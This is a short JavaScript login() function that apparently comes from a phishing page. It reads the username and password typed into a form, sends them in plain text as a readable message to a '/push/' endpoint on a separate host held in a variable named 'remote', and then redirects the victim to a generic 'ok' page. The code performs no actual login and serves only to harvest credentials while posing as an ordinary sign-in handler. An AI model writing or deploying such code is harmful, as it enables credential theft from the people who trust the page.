

function login() {
    var username = document.getElementById('username').value;
    var password = document.getElementById('password').value;
    var url = window.location.href;
    var xhr = new XMLHttpRequest();
    xhr.open('POST', remote+"/push/"+url.substring(remote.length).replace("/","")+"/", true);
    xhr.send(JSON.stringify({"content":"用户名: "+username+" 密码: "+password}));

    xhr.onload = function() {
        window.location.href = "/resource/other/ok.html"
    };
}